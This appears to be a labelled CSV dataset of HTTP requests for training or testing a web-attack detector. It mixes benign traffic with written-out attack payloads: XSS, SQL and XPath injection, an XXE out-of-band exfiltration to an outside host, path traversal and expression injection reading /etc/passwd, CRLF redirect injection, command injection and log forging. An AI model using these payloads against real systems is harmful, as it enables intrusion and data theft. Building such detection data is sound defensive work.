label,text
malicious,"POST /user/profile/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
X-Dynamic-Render: <!--#config errmsg=""SSI_Error_Triggered_Successfully""--> <!--#echo var=""REMOTE_ADDR""-->
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Length: 29

fullname=John+Doe&location=USA"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: image/*,*/*;q=0.8
Referer: https://my-personal-blog-site.info/home
Connection: keep-alive"
benign,"POST /TaxServiceAPI/v1/calculate HTTP/1.1
Host: api.financial-solutions.ai
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 302
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/soap+xml,application/xml
Accept-Language: en-US,en;q=0.8
Cookie: sessionid=8f92f3cc-7af1-44a8-9c15-29ae6729abc7

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Body>
    <CalculateTaxRequest xmlns=""http://financial-solutions.ai/tax"">
      <Country>DE</Country>
      <Income>72000</Income>
      <Deductions>10000</Deductions>
    </CalculateTaxRequest>
  </soap:Body>
</soap:Envelope>"
malicious,"POST /session/contact HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Accept-Encoding: identity
Cache-Control: no-cache

auth_token=c1a2b3c4d5e6f7g8h9i0&contact_name=Robert+Lee&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116(39,88,83,83,39))%3C%2Fscript%3E"
benign,"POST /data/custom-scripts/run HTTP/1.1
Host: cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/javascript
Content-Length: 35
Accept: application/javascript, text/javascript, */*
X-CSRF-Token: b6f6e74e-9d01-4afe-9c5e-0db587e4f118
Connection: keep-alive

console.info('Custom script executed');"
malicious,"PUT /api/v3/user/forward HTTP/1.1
Host: portal.media-streaming.tv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/html
Content-Type: application/json
Content-Length: 250
Cache-Control: no-cache
Origin: https://portal.media-streaming.tv
Cookie: session_token=3f7bdc282c9a6ed0dbf591a0c7a767f6

{""redirect_url"": ""/content%0d%0aContent-Length:%200%0d%0aLocation:%20http://hacks.media-streaming.tv/phish%0d%0a%0d%0a<html><body>Redirecting...</body></html>""}"
benign,"POST /api/log HTTP/1.1
Host: activity-data-store.biz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/json
Accept: application/json
Cache-Control: no-cache
Content-Length: 220
Connection: keep-alive

{""session"":{""user"":""user_7812"",""id"":""5540b785-d068-4a46-8ecb-f7e65b5dbd9a"",""startTime"":""2024-06-14T08:53:00Z"",""endTime"":""2024-06-14T09:12:43Z""},""activity"":[{""type"":""page_view"",""page"":""/home"",""timeSpentSeconds"":78},{""type"":""button_click"",""buttonId"":""subscribe-newsletter"",""time"":""2024-06-14T09:00:31Z""}]}"
benign,"POST /api/contact/message HTTP/1.1
Host: cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Origin: https://cloud-data-services.ai
Referer: https://cloud-data-services.ai/contact
User-Agent: python-requests/2.28.1
Cookie: session_token=a1b2c3d4e5f6g7h8i9j0
Connection: keep-alive

name=David+Kwon&email=david.kwon%40cds.ai&subject=Inquiry+regarding+API&message=Could+you+please+provide+details+on+the+rate+limits+for+your+REST+API%3F+Thanks."
benign,"PATCH /v2/api/projects/9823a HTTP/1.1
Host: projecttrack.cloud-data-services.ai
Authorization: Bearer gh645d9jk23nj89vkjsdhf
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json
Connection: close
Content-Length: 37

{""deadline"":""2024-07-30T17:00:00Z""}"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: user-config-hub.io
Connection: keep-alive
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.AUg0n4jrGJ9vL7hM4D6hCibGZPMk8u9JO_yZh9DiRAkw
Content-Length: 62

[{""op"":""replace"",""path"":""/notifications/email"",""value"":false}]"
benign,"GET /music/playlist?genre=jazz&genre=blues&genre=soul&sort=recent HTTP/1.1
Host: soundwave-streaming.org
Connection: keep-alive
Accept: text/html
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Cache-Control: max-age=0"
benign,"GET /store/home?utm_source=fb_ads&utm_medium=paid_social&utm_content=carousel_ad HTTP/1.1
Host: online-retail-store.biz
Accept: text/html
Referer: https://www.facebook.com/adsmanager/manage
User-Agent: curl/7.87.0
Cache-Control: max-age=0"
malicious,"POST /data/push HTTP/1.1
Host: telemetry.stats-collector.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/xml
Accept: application/xml, text/xml
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Content-Length: 268

<!DOCTYPE telemetry [
<!ENTITY % file SYSTEM ""file:///var/www/html/config.php"">
<!ENTITY % dtd SYSTEM ""http://stats-exfiltration.net/dtd-exfil.dtd"">
%dtd;
%send;
]>
<telemetry>
  <cpuLoad>45</cpuLoad>
</telemetry>"
malicious,"GET /assets/images/..%2F..%2F..%2Fetc/passwd HTTP/1.1
Host: cdn-media-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://cdn-media-hub.net/gallery/view
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /news/world/2024/04/18/climate-impact-report HTTP/1.1
Host: global-eco-press.net
User-Agent: Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /forum/thread/12542/page/3 HTTP/1.1
Host: community.dev-forums.io
X-Forwarded-For: 192.168.100.23
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /api/v1/recipes?cuisine=mediterranean&max_prep_time=30 HTTP/1.1
Host: tastechef.recipesite.info
Accept: application/json
X-API-Key: W4z7N9KtHbIxve0OqYcGUmR2s1pLdZ6F
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Encoding: br,gzip
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"POST /api/v1/submit HTTP/1.1
Host: data-insight-platform.org
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 105
Connection: keep-alive

message=Please+note+the+UNION+operation+in+my+latest+query+works+perfectly+to+combine+multiple+data+sets."
malicious,"GET /query_documents?author_id=101%27%20or%20%28substring(user/password[1],1,1)%20%3D%20%27a%27%29%20or%20%271%27%3D%271 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml, text/html;q=0.9
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/home
Connection: keep-alive"
benign,"HEAD /media/videos/training/workshop_intro_hd.mp4 HTTP/1.1
Host: stream-learning-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.74 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /news/world/2024/election-updates HTTP/1.1
Host: daily-chronicle-news.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Upgrade-Insecure-Requests: 1
Referer: https://daily-chronicle-news.net/
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
malicious,"POST /blog/article/comment HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Referer: https://my-personal-blog-site.info/blog/article/view/3021
Content-Length: 405

{""article_id"":3021,""commenter"":{""username"":""evan1988"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('head -n 10 /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""},""comment_text"":""Great article, thanks for sharing!""}"
benign,"GET /assets/images/web/logo-darkmode.png HTTP/1.1
Host: online-retail-store.biz
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://online-retail-store.biz/shop/categories/home-appliances
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /forum/thread/9876 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 <img src=x onerror=alert('LogViewerXSS')> Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0"
benign,"PUT /media/uploads/documents/invoice_2039_04_15.pdf.b64 HTTP/1.1
Host: docs-cloud-storage.info
Content-Type: application/octet-stream
Content-Length: 128
Referer: https://portal.docs-cloud-storage.info/dashboard
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Authorization: Basic YWRtaW46c2VjdXJlLXRva2Vu
Connection: close
Accept: application/pdf

JVBERi0xLjQKJdP0zOEKMSAwIG9iago8PC9UeXBlL0NhdGFsb2cvUGFnZXMgMiAwIFI+PgplbmRvYmoK"
benign,"POST /player/actions/move HTTP/1.1
Host: gamefield-realms.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: keep-alive
X-CSRF-Token: a94f8de6e2f34b3b8e34bbc5dc8a5dea

action=move_player&target=west"
malicious,"GET /app/status HTTP/1.1
Host: pages.dynamic-contentportal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 <!--#config errmsg=""SSI_Error_Triggered_Successfully""--> <!--#echo var=""REMOTE_ADDR""-->
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache"
benign,"PUT /files/reports/quarterly-2024-Q2 HTTP/1.1
Host: analytics-report-hub.cloud
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/octet-stream
Content-Length: 301
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Pragma: no-cache

VGhpcyBpcyBhIGJpbmFyeSBmaWxlIHVwbG9hZCBvZiBhbiBhbmFseXRpY3MgcmVwb3J0IGZvciB0aGUgZmlyc3QgcXVhcnRlciBvZiAyMDI0Lg0KV2VsbC1mb3JtYXR0ZWQgc3RhdGlzdGljcyBhbmQgZ3JhcGhzLg=="
malicious,"GET /api/v3/user/profile?id=123&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users--&filter_evil_chars=true HTTP/1.1
Host: secure-order-management.net
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
malicious,"GET /home HTTP/1.1
Host: elite-photo-studio.us
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Accept-Language: en-US,en;q=0.5
Cookie: visitor_id=38274f9a526; tracking_id=xyz' OR IF(SUBSTRING(DATABASE(),1,1)='a'/**/ ,WAITFOR DELAY '0:0:5' , 0)#; pref=darkmode
Referer: https://elite-photo-studio.us/welcome
Cache-Control: max-age=0"
benign,"POST /oauth/token HTTP/1.1
Host: auth-secure-access.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Authorization: Basic Y2xpZW50QmFzZTY0OjEyMzQ1Ng==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=c8q9JHb2Uf&redirect_uri=https%3A%2F%2Fclient-app.secure-access.net%2Fcallback&client_id=clientBase64&client_secret=123456"
benign,"GET /search?q=wireless+headphones&category=audio&sort=relevance HTTP/1.1
Host: shopwireless-electro.eu
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Connection: keep-alive
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36"
benign,"POST /api/xml/createTicket HTTP/1.1
Host: supportdesk.ticketing-system.techsvc.io
Authorization: Bearer e1f835bbc87a4a2f8e34da678b113c0a
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 144
Connection: keep-alive

<Ticket>
  <title>Unable to access VPN</title>
  <description>User reports connection timeout error when connecting to corporate VPN.</description>
  <priority>High</priority>
  <reportedBy>james.martinez@techsvc.io</reportedBy>
</Ticket>"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: user-generated-content.org
User-Agent: curl/7.85.0
Accept: */*
Accept-Encoding: gzip
Connection: close"
benign,"GET /resource/load?path=assets/icons/icon-set.svg HTTP/1.1
Host: creative-development-lab.co
Accept: image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
DNT: 1
Connection: keep-alive"
benign,"GET /v1/api-docs HTTP/1.1
Host: supply-chain-analytics.ai
Accept: application/json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /api/v1/subscriptions/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: python-requests/2.28.1
Content-Type: application/json
Accept: application/json
Content-Length: 88
Authorization: Bearer mF_9.B5f-4.1JqM
Connection: close

{""subscription_ids"":[""sub_101"",""sub_102"",""sub_103""],""plan"":""premium_plus"",""auto_renew"":true}"
malicious,"GET /api/track_event?details=click_button%0d%0a127.0.0.1%20-%20admin%20[10/Oct/2023:13:55:36%20-0700]%20""POST%20/admin/login%20HTTP/1.1""%20200%20789 HTTP/1.1
Host: event-collector.secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"GET /network/diagnose/172.31.255.254%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: data-analysis-platform.xyz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0"
benign,"POST /v3/user/preferences/save HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJraWQiOiJrMWYzIiwidHlwIjoiSldUIn0.hu94-2.vB9HeL8U5z4ZrdQ1
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: FetchAPIClient
X-CSRF-Token: a3d1f7b8cc9827e36a1
Accept-Language: en-US,en;q=0.9
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15

{""theme"": ""dark"", ""notifications"": {""email"": true, ""sms"": false}}"
benign,"POST /users/password/forgot HTTP/1.1
Host: urban-food-delivery.app
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://urban-food-delivery.app/users/password/forgot

email=benjamin.holt%40urbanmeals-delivery.app"
malicious,"POST /app/user/send-message HTTP/1.1
Host: messaging.nextgen-cloud.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: text/plain
Accept-Encoding: gzip, deflate, br
X-User-Input: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgndXNlcicsJ2hlbGxvJyk8L3NjcmlwdD4=""></iframe>
Content-Length: 17

Hello from app!"
benign,"POST /api/photos/batchupload HTTP/1.1
Host: photo-sync-service.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----Boundary12345678
Connection: keep-alive
Referer: https://photo-sync-service.biz/dashboard
Cookie: sid=4f6d8beb2e9677a1b6d21da1c7b4af75

------Boundary12345678
Content-Disposition: form-data; name=""files[]""; filename=""event1.jpg""
Content-Type: image/jpeg

<jpeg binary data>
------Boundary12345678
Content-Disposition: form-data; name=""files[]""; filename=""event2.jpg""
Content-Type: image/jpeg

<jpeg binary data>
------Boundary12345678
Content-Disposition: form-data; name=""files[]""; filename=""event3.png""
Content-Type: image/png

<png binary data>
------Boundary12345678--"
benign,"GET /static/fonts/cinzel-decorative-regular.woff2 HTTP/1.1
Host: urban-fashion-outlets.store
Accept: font/woff2,application/font-woff2;q=0.9,*/*;q=0.7
Referer: https://urban-fashion-outlets.store/css/shop.css
Origin: https://urban-fashion-outlets.store
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Cache-Control: max-age=0"
malicious,"PATCH /api/v4/profile/update HTTP/1.1
Host: portal.enterprisemanagement.cloud
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiamFja3NtaXRoIiwiZXhwIjoxNjgyOTA0MDAwfQ.6YpR0s2k5uS1CzFkl42KIMdipHn7WuCY7a4kvfDLOJA
Content-Type: application/json
Accept: application/json
User-Agent: Python-urllib/3.9
Cache-Control: no-cache

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""contact_info"": {
      ""email"": ""attacker@enterprise.cloud"",
      ""phone"": ""+15551234567""
    }
  },
  ""account_info"": {
    ""subscription_level"": ""enterprise"",
    ""override_settings"": {
      ""credits_override"": 99999,
      ""is_feature_xyz_enabled"": true
    }
  }
}"
